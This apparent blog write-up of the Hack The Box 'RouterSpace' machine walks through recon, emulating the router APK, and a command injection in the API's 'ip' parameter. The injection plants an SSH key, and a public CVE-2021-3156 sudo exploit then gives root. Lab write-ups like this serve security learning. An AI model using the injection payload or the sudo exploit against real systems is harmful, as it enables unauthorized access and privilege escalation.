---
layout: single
title: Routerspace - Hack The Box
excerpt: "RouterSpace is an easy-rated Linux machine from Hack The Box. It is very different from other boxes as we're tasked with compromizing a router apk-file. Personally I found the hardest part to be finding the tools needed for the job. Once everything was setup properly the path from foothold to user to root took about 20 minutes. Looking back I learned a lot from this machine, and it was quite fun to own. Would recommend!"
date: 2022-03-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-routerspace/routerspace_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
tags:  
  - linux
  - easy
  - apk
  - anbox
  - adb
  - rce
  - sudo
---

![](/assets/images/htb-writeup-routerspace/routerspace_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

RouterSpace is an easy-rated Linux machine from Hack The Box. It is very different from other boxes as we're tasked with compromizing a router apk-file. Personally I found the hardest part to be finding the tools needed for the job. Once everything was setup properly the path from foothold to user to root took about 20 minutes. Looking back I learned a lot from this machine, and it was quite fun to own. Would recommend!
<br>
<br >

----------------

# USER

### Step 1

**nmap:**
```bash
┌──(void㉿void)-[/htb/routerspace]
└─$ nmap -p- 10.10.11.148     
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


┌──(void㉿void)-[/htb/routerspace]
└─$ nmap -p22,80 -sCV 10.10.11.148
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 09:22 CEST
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-77288
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 70
|     ETag: W/"46-abbFyEBeXh9CSfIO4E5mGzrEQI0"
|     Date: Mon, 28 Mar 2022 07:24:55 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: zLw qUksX fN OW A }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-62862
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Mon, 28 Mar 2022 07:24:54 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-79870
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Mon, 28 Mar 2022 07:24:54 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about


[root:/git/htb/pandora]# nmap -sU --top-port=20 --open 10.10.11.136
PORT     STATE         SERVICE
67/udp   open|filtered dhcps
68/udp   open|filtered dhcpc
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open          snmp
520/udp  open|filtered route
4500/udp open|filtered nat-t-ike
```

**dirb:**
```bash
N/A
```

**nikto:**
```bash
+ Uncommon header 'x-cdn' found, with contents: RouterSpace-66427
```

**ffuf:**
```bash
$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.148/FUZZ -fs 50-95
css                     [Status: 301, Size: 173, Words: 7, Lines: 11]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11]
img                     [Status: 301, Size: 173, Words: 7, Lines: 11]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11]

$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.148/FUZZ.html -fs 50-95
contact                 [Status: 200, Size: 46439, Words: 10270, Lines: 358]
```

-----------------

### Step 2
Visit the website and we find multiple download buttons, all leading to ``RouterSpace.apk``. Before we analyze the binary, we look on `contact.html`, while there we find `features.html` and `Pricing.html`, both gives some strange output.

```bash
$ curl -v http://10.10.11.148/features.html
> GET /features.html HTTP/1.1
> Host: 10.10.11.148

< HTTP/1.1 200 OK
< X-Powered-By: RouterSpace
< X-Cdn: RouterSpace-65007
< 
Suspicious activity detected !!! {RequestID: Z   73Mv z    F F i }

																										   
┌──(void㉿void)-[/htb/routerspace]
└─$ curl -v http://10.10.11.148/Pricing.html 
> GET /Pricing.html HTTP/1.1
> Host: 10.10.11.148

< HTTP/1.1 200 OK
< X-Powered-By: RouterSpace
< X-Cdn: RouterSpace-85902
< 
Suspicious activity detected !!! {RequestID: l2  Pmi   K lhy9 vL C yj6a  }
```

Unzip the .apk-file and start analyzing the data..
.. we find host name in `apk-unpack/META-INF/CERT.RSA` - ``routerspace.htb``

Nothing more of value at first glance. As this is a easy box we should probably look for something obvious, like a public key for the SSH service, some API call or similar. 
Analyzing the data further with ``jd-gui`` and ``MobSF`` doesn't give anything of value either.

Change approach and try to emulate the apk using ``Anbox`` and ``adb``:
```
Install (if "ls -1 /dev/{ashmem,binder}" gives not found):
$ apt install dkms linux-headers-amd64
$ git clone https://github.com/anbox/anbox-modules.git
$ sudo ./INSTALL.sh
$ sudo modprobe ashmem_linux && sudo modprobe binder_linux
$ ls -1 /dev/{ashmem,binder}

$ sudo apt install snapd
$ service snapd start
$ sudo snap install --devmode --beta anbox

$ sudo apt install android-tools-adb
$ adb devices
 * daemon not running; starting now at tcp:5037
 * daemon started successfully
 List of devices attached
$ anbox launch --package=org.anbox.appmgr
$ adb devices                            
 List of devices attached
 emulator-5558	device
$ adb install RouterSpace.apk            
 Performing Streamed Install
 Success
$ anbox.appmgr 


If not able to enable proxy, kill all adb and anbox servies and try again.
$ kill ...
$ adb devices
$ adb shell settings put global http_proxy 192.168.101.187:8181
$ anbox.appmgr
```

**Burp Proxy Settings**:
![](/assets/images/htb-writeup-routerspace/routerspace01.png)


We are now able to capture the `Check Status` API call in Burp.
![](/assets/images/htb-writeup-routerspace/routerspace02.png)


-------------

### Step 3
We have one data parameter to play with, ``ip``, and we quickly find that it's not sanitized and vulnerable for command injection.

![](/assets/images/htb-writeup-routerspace/routerspace03.png)

Generate a new SSH key, inject it and login as user Paul. Grab user.txt.
```bash
┌──(void㉿void)-[/htb/routerspace]
└─$ ssh-keygen -t rsa -b 4096 -f paul-id_rsa

┌──(void㉿void)-[/htb/routerspace]
└─$ cat paul-id_rsa.pub  
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC [... snip ...]

Inject the payload in Burp Repeater: 
mkdir -p /home/paul/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC [... snip ...]' > /home/paul/.ssh/authorized_keys

┌──(void㉿void)-[/htb/routerspace]
└─$ ssh paul@routerspace.htb -i paul-id_rsa

paul@routerspace:~$ id && cat user.txt 
uid=1001(paul) gid=1001(paul) groups=1001(paul)
e8f2d33e776f9e917eeab833f5dff7a6
```


--------------

# ROOT

### Step 1 
With some quick manual enumeration we find that the sudo version is old and vulnerable to CVE-2021-3156.

```bash
paul@routerspace:~$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31

paul@routerspace:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.3 LTS
Release:	20.04
Codename:	focal

┌──(void㉿void)-[/htb/routerspace]
└─$ scp -i paul-id_rsa -rp sudo-exploit-main paul@routerspace.htb:/dev/shm                                                                                1 ⨯
sice.c                                                                                                                      100%  176     5.5KB/s   00:00    
README.md                                                                                                                   100%  234     7.6KB/s   00:00    
Makefile                                                                                                                    100%   95     3.0KB/s   00:00    
exploit.c                                                                                                                   100% 2651    82.9KB/s   00:00 

paul@routerspace:/dev/shm/sudo-exploit-main$ make
gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:75:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
   75 |     execve(argv[0], argv, env);
      |     ^~~~~~
mkdir libnss_X
gcc -g -fPIC -shared sice.c -o libnss_X/X.so.2

paul@routerspace:/dev/shm/sudo-exploit-main$ ./exploit 
root@routerspace:/dev/shm/sudo-exploit-main# id && cat /root/root.txt
uid=0(root) gid=1001(paul) groups=1001(paul)
3d6de1c1362a1d59bd130fd45d895e45
```


------

# References
**Install Anbox:**
https://docs.anbox.io/userguide/install_kernel_modules.html

**CVE-2021-3156:**
https://github.com/redhawkeye/sudo-exploit
